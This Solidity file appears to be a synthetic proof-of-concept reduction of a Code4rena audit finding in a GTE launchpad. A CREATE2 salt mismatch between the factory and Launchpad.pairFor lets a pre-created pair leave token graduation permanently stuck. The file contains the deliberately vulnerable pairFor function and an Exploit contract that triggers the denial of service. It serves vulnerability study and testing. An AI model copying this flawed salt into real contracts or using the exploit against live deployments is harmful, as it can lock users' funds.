// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    GTE — Launchpad pairFor CREATE2 salt mismatches factory
    (Code4rena 2025-08-gte-perps-and-launchpad, finding #64856 / H-08)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: GTELaunchpadV2PairFactory CREATE2 salt includes
    (token0, token1, launchpadLp, launchpadFeeDistributor), but Launchpad.pairFor
    only hashes (token0, token1). When createPair already exists and the try/catch
    leaves `pair` as the wrong predicted address, graduation talks to an empty
    address → permanent bonding-state stuck.

    Blamed lines: Launchpad.sol L569-L587 pairFor salt @ f43e1eed.
//////////////////////////////////////////////////////////////////////////*/

contract MockPair {
    address public token0;
    address public token1;
    address public launchpadLp;
    address public launchpadFeeDistributor;

    function initialize(address t0, address t1, address lp, address dist) external {
        token0 = t0;
        token1 = t1;
        launchpadLp = lp;
        launchpadFeeDistributor = dist;
    }

    function mint(address) external pure returns (uint256) {
        return 1;
    }
}

contract GTELaunchpadV2PairFactory {
    address public immutable launchpad;
    address public immutable launchpadLp;
    address public immutable launchpadFeeDistributor;

    mapping(address => mapping(address => address)) public getPair;

    bytes32 public immutable INIT_CODE_HASH;

    constructor(address _launchpad, address _lp, address _dist) {
        launchpad = _launchpad;
        launchpadLp = _lp;
        launchpadFeeDistributor = _dist;
        INIT_CODE_HASH = keccak256(type(MockPair).creationCode);
    }

    function createPair(address tokenA, address tokenB) external returns (address pair) {
        require(tokenA != tokenB, "IDENTICAL");
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        require(getPair[token0][token1] == address(0), "PAIR_EXISTS");
        bytes memory bytecode = type(MockPair).creationCode;
        (address _lp, address _dist) =
            msg.sender == launchpad ? (launchpadLp, launchpadFeeDistributor) : (address(0), address(0));
        bytes32 salt = keccak256(abi.encodePacked(token0, token1, _lp, _dist));
        assembly {
            pair := create2(0, add(bytecode, 32), mload(bytecode), salt)
        }
        MockPair(pair).initialize(token0, token1, _lp, _dist);
        getPair[token0][token1] = pair;
        getPair[token1][token0] = pair;
    }
}

/// @dev Reduced Launchpad graduation path with wrong pairFor.
contract Launchpad {
    GTELaunchpadV2PairFactory public uniV2Factory;
    address public launchpadLp;
    address public feeDistributor;
    bytes32 public uniV2InitCodeHash;

    mapping(address => address) public quoteOf;
    mapping(address => bool) public graduated;
    bool public graduationReverted;

    constructor(address factory_, address lp_, address dist_, bytes32 initHash_) {
        uniV2Factory = GTELaunchpadV2PairFactory(factory_);
        launchpadLp = lp_;
        feeDistributor = dist_;
        uniV2InitCodeHash = initHash_;
    }

    function registerBonding(address token, address quote) external {
        quoteOf[token] = quote;
    }

    // calculates the CREATE2 address for a pair without making any external calls
    function pairFor(address factory, address tokenA, address tokenB) internal view returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        // @> VULN: salt omits launchpadLp + launchpadFeeDistributor used by factory
        pair = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            hex"ff",
                            factory,
                            keccak256(abi.encodePacked(token0, token1)),
                            uniV2InitCodeHash // init code hash
                        )
                    )
                )
            )
        );
        // FIX: include launchpadLp + feeDistributor in the salt, matching the factory
    }

    function graduate(address token) external {
        address quote = quoteOf[token];
        require(quote != address(0), "unknown");
        address pair = pairFor(address(uniV2Factory), token, quote);

        // Create or get the pair
        try uniV2Factory.createPair(token, quote) returns (address p) {
            pair = p;
        } catch {
            // Do nothing, pair exists — pair stays as wrong pairFor prediction
        }

        uint256 size;
        assembly {
            size := extcodesize(pair)
        }
        if (size == 0) {
            graduationReverted = true;
            revert("graduation: pair is not a contract (wrong CREATE2)");
        }
        MockPair(pair).mint(launchpadLp);
        graduated[token] = true;
    }

    function predictedPair(address token, address quote) external view returns (address) {
        return pairFor(address(uniV2Factory), token, quote);
    }
}

contract Exploit {
    GTELaunchpadV2PairFactory public factory; // CREATE 1
    Launchpad public launchpad; // CREATE 2 — vulnerable

    address public constant TOKEN = address(0x1001);
    address public constant QUOTE = address(0x1002);

    address public realPair;
    address public wrongPredicted;
    bool public stuck;

    constructor() {
        address lp = address(uint160(0xB10B));
        address dist = address(uint160(0xD15D));
        // Pre-create pair as launchpad (this contract) so salt uses (lp, dist)
        factory = new GTELaunchpadV2PairFactory(address(this), lp, dist);
        bytes32 initHash = factory.INIT_CODE_HASH();
        launchpad = new Launchpad(address(factory), lp, dist, initHash);
        realPair = factory.createPair(TOKEN, QUOTE);
        launchpad.registerBonding(TOKEN, QUOTE);
    }

    function run() external {
        wrongPredicted = launchpad.predictedPair(TOKEN, QUOTE);
        require(wrongPredicted != realPair, "addresses unexpectedly match");
        require(realPair.code.length > 0, "real pair missing");
        require(wrongPredicted.code.length == 0, "wrong predicted has code");

        // graduate reverts (state rolled back) when pair points at empty CREATE2 address
        try launchpad.graduate(TOKEN) {
            stuck = false;
        } catch {
            stuck = true;
        }
        require(stuck, "harm not demonstrated: graduation should be stuck");
        require(!launchpad.graduated(TOKEN), "must not graduate");
        // Prove the predicted address is not the real factory pair and has no code
        require(wrongPredicted != realPair, "predicted must differ from factory pair");
        require(wrongPredicted.code.length == 0, "predicted must be empty (wrong salt)");
    }
}
